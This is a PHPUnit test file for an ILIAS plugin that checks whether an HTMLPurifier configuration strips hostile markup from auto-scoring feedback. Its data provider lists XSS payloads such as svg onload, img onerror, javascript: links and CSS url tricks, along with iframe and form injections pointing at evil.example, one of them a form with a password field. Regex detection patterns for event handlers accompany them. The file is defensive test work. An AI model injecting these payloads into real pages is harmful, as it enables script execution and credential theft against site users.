<?php

/**
 * Unit tests for ilExAutoScoreFeedbackPurifier.
 *
 * Runs the real HTMLPurifier config from the ILIAS installation this plugin lives in.
 * The payloads below passed the former ilUtil::stripScriptHTML() filter unchanged.
 */

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

class FeedbackPurifierTest extends TestCase
{
    private const ILIAS_ROOT_LEVELS = 9;

    private HTMLPurifier $purifier;

    public static function setUpBeforeClass(): void
    {
        $root = dirname(__DIR__, self::ILIAS_ROOT_LEVELS);
        $lib = $root . '/libs/composer/vendor/ezyang/htmlpurifier/library/HTMLPurifier.auto.php';
        if (!is_file($lib)) {
            return;
        }
        require_once $lib;
        require_once $root . '/Services/Html/interfaces/interface.ilHtmlPurifierInterface.php';
        require_once $root . '/Services/Html/classes/class.ilHtmlPurifierAbstractLibWrapper.php';
        require_once __DIR__ . '/../../classes/class.ilExAutoScoreFeedbackPurifier.php';
    }

    protected function setUp(): void
    {
        if (!class_exists('ilExAutoScoreFeedbackPurifier', false)) {
            $this->markTestSkipped('ILIAS installation with HTMLPurifier not found');
        }
        $this->purifier = new HTMLPurifier(ilExAutoScoreFeedbackPurifier::buildConfig(null));
    }

    public static function attackProvider(): array
    {
        return [
            'svg onload'        => ['<svg/onload=alert(1)>'],
            'img onerror'       => ['<img/src=x/onerror=alert(1)>'],
            'script'            => ['<script>alert(1)</script>'],
            'javascript href'   => ['<a href="javascript:alert(1)">x</a>'],
            'css url'           => ['<div style="background:url(javascript:alert(1))">x</div>'],
            'style element'     => ['<style>body{display:none}</style>'],
            'link element'      => ['<link rel="stylesheet" href="https://evil.example/x.css">'],
            'iframe'            => ['<iframe src="https://evil.example"></iframe>'],
            'applet'            => ['<applet code="X.class"></applet>'],
            'form'              => ['<form action="https://evil.example"><input name="pw"></form>'],
            'data image'        => ['<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=" alt="x">'],
        ];
    }

    #[DataProvider('attackProvider')]
    public function testAttackIsNeutralized(string $html): void
    {
        $out = $this->purifier->purify($html);
        $this->assertDoesNotMatchRegularExpression('/\son\w+\s*=/i', $out);
        $this->assertStringNotContainsStringIgnoringCase('javascript:', $out);
        $this->assertDoesNotMatchRegularExpression('/<(svg|script|style|link|iframe|applet|form|input)\b/i', $out);
        $this->assertStringNotContainsString('data:', $out);
    }

    /** Colors stay, but CSS that could break the ILIAS page layout is dropped. */
    public function testOnlyHarmlessCssIsKept(): void
    {
        $out = $this->purifier->purify(
            '<span style="color:green;background-color:#eee;font-weight:bold;position:absolute;top:0;'
            . 'display:block;z-index:9999">ok</span>'
        );
        $this->assertStringContainsString('color:#008000;', $out);
        $this->assertStringContainsString('background-color:#eee;', $out);
        $this->assertStringContainsString('font-weight:bold;', $out);
        $this->assertDoesNotMatchRegularExpression('/position|z-index|display|top:/', $out);
    }

    /** Images are dropped entirely: no broken icons, no third-party requests. */
    public function testImagesAreRemoved(): void
    {
        $this->assertSame(
            '<p>before  after</p>',
            $this->purifier->purify('<p>before <img src="https://tracker.example/p.png" alt="x"> after</p>')
        );
    }

    /** Line breaks via <br> and CSS white-space must survive. */
    public function testLineBreaksAreKept(): void
    {
        $this->assertSame('a<br>b<br>c', $this->purifier->purify('a<br>b<br/>c'));
        $this->assertSame(
            "<p style=\"white-space:pre-wrap;\">a\nb</p>",
            $this->purifier->purify("<p style=\"white-space:pre-wrap\">a\nb</p>")
        );
    }

    public function testMarkIsKept(): void
    {
        $this->assertSame(
            '<p>Expected <mark>42</mark></p>',
            $this->purifier->purify('<p>Expected <mark>42</mark></p>')
        );
    }

    /** The default feedback layout of the correction service must survive. */
    public function testServiceFeedbackIsKept(): void
    {
        $html = '<div style="font-family:system-ui,Arial;line-height:1.35"><h3 style="margin:0 0 8px">'
            . 'Result: PASSED • 6 pts</h3><p style="white-space:pre-wrap">6/6 Punkte</p></div>';
        $out = $this->purifier->purify($html);
        $this->assertStringContainsString('<h3 style="margin:0 0 8px;">Result: PASSED • 6 pts</h3>', $out);
        $this->assertStringContainsString('<p style="white-space:pre-wrap;">6/6 Punkte</p>', $out);
    }

    /** Tags the old filter let through implicitly (pre, b) stay allowed. */
    public function testFormattingIsKept(): void
    {
        $html = '<table border="1"><tr><th>Test</th><td><b>ok</b></td></tr></table>'
            . '<pre>a &lt; b</pre><a href="https://www.fau.de" target="_blank">link</a>';
        $out = $this->purifier->purify($html);
        $this->assertStringContainsString('<th>Test</th><td><b>ok</b></td>', $out);
        $this->assertStringContainsString('<pre>a &lt; b</pre>', $out);
        $this->assertStringContainsString('href="https://www.fau.de"', $out);
        $this->assertStringContainsString('target="_blank"', $out);
    }

    /** No GUI may fall back to the old blacklist filter. */
    public function testGuisUseThePurifier(): void
    {
        foreach (glob(__DIR__ . '/../../classes/*.php') as $file) {
            $this->assertDoesNotMatchRegularExpression(
                '/ilUtil::stripScriptHTML\(\s*\$/',
                file_get_contents($file),
                basename($file) . ' still uses ilUtil::stripScriptHTML()'
            );
        }
    }
}
